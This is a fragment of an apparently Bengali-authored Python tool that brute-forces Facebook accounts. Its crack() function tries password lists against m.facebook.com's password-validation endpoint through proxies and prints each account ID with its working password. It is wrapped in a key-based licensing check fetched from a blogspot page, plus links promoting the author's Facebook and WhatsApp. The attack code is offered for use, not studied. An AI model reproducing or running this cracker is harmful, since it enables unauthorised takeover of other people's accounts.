...
def menu(my_name,my_id):
	...
	if _____MAMUN_____ in ['2']:
		os.system("play-audio Firsr_Follow_My_GitHub.mp3")
		os.system("xdg-open https://www.facebook.com/mdbiplob.mollo")
...
class D:
	...
	def plerr(self):
		...
		banner()
		try:
			print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;34m     Example: /sdcard/file.txt     \033[40m\033[00m')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [TT] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=1',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;93m[TT-CP] {idf} | {pw}{N}')     
...
def RMX():
  ...
  id = "≠".join(uuid)
  try:
    httpCaht = requests.get('https://approvalkey.blogspot.com/2023/02/keytxt.html?m=1').text
    if id in httpCaht:
      msg = str(os.geteuid())
      time.sleep(0.3)
      login()
      ...
      print("\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] \033[1;38mYOUR KEY :\033[1;32m TT="+id)
      print('\033[1;36m┗─────────────────────────────────────────┛')
      os.system('xdg-open https://wa.me/+8801848266826')
      time.sleep(3)
      sys.exit()
  except:
      sys.exit()
